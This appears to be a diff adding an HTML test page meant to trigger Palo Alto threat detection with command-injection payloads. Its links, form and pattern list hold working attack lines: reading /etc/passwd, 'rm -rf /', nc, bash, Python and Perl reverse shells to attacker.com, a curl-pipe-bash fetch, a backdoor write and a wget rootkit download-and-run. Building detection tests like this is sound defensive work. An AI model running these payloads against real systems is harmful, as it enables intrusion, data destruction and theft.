@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Command Injection Test Page</title>
+</head>
+<body>
+    <h1>Command Injection Test Page</h1>
+    
+    <p>This page contains multiple command injection vectors that should trigger Palo Alto's threat detection.</p>
+    
+    <h2>Command Injection Test Links</h2>
+    <ul>
+        <li><a href="/cmd.php?cmd=cat%20/etc/passwd">Basic Command Injection (cat /etc/passwd)</a></li>
+        <li><a href="/cmd.php?cmd=ls%20-la%20/">Directory Listing Command (ls -la /)</a></li>
+        <li><a href="/cmd.php?cmd=;%20id">Command Chaining Injection (; id)</a></li>
+        <li><a href="/cmd.php?cmd=|%20whoami">Pipe Command Injection (| whoami)</a></li>
+        <li><a href="/cmd.php?cmd=%24(id)">Command Substitution Injection ($(id))</a></li>
+        <li><a href="/cmd.php?cmd=%60uname%20-a%60">Backtick Command Injection (`uname -a`)</a></li>
+        <li><a href="/cmd.php?cmd=;%20rm%20-rf%20/">Dangerous Command Injection (; rm -rf /)</a></li>
+        <li><a href="/cmd.php?cmd=|%20nc%20-e%20/bin/bash%20attacker.com%204444">Reverse Shell Injection (| nc -e /bin/bash attacker.com 4444)</a></li>
+        <li><a href="/cmd.php?cmd=%24(curl%20-s%20http://attacker.com/shell.sh%20|%20bash)">Download and Execute Injection ($(curl -s http://attacker.com/shell.sh | bash))</a></li>
+    </ul>
+    
+    <h2>Command Injection Test Form</h2>
+    <form action="/cmd.php" method="get">
+        <div>
+            <label for="cmd">Command:</label>
+            <input type="text" id="cmd" name="cmd" value="cat /etc/passwd" style="width: 300px;">
+        </div>
+        <button type="submit">Execute Command</button>
+    </form>
+    
+    <h2>Advanced Command Injection Patterns</h2>
+    <ul id="advanced-patterns">
+        <li>; bash -i >& /dev/tcp/attacker.com/4444 0>&1</li>
+        <li>| python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</li>
+        <li>; perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</li>
+        <li>& echo 'malicious content' > /var/www/html/backdoor.php</li>
+        <li>|| wget http://attacker.com/rootkit -O /tmp/rootkit; chmod +x /tmp/rootkit; /tmp/rootkit</li>
+    </ul>
+    
+    <script>
+        // Add click handlers to copy advanced patterns to the command input
+        document.addEventListener('DOMContentLoaded', function() {
+            var advancedPatterns = document.querySelectorAll('#advanced-patterns li');
+            var cmdInput = document.getElementById('cmd');
+            
+            for (var i = 0; i < advancedPatterns.length; i++) {
+                advancedPatterns[i].style.cursor = 'pointer';
+                advancedPatterns[i].addEventListener('click', function() {
+                    cmdInput.value = this.textContent;
+                });
+            }
+        });
+    </script>
+</body>
+</html>
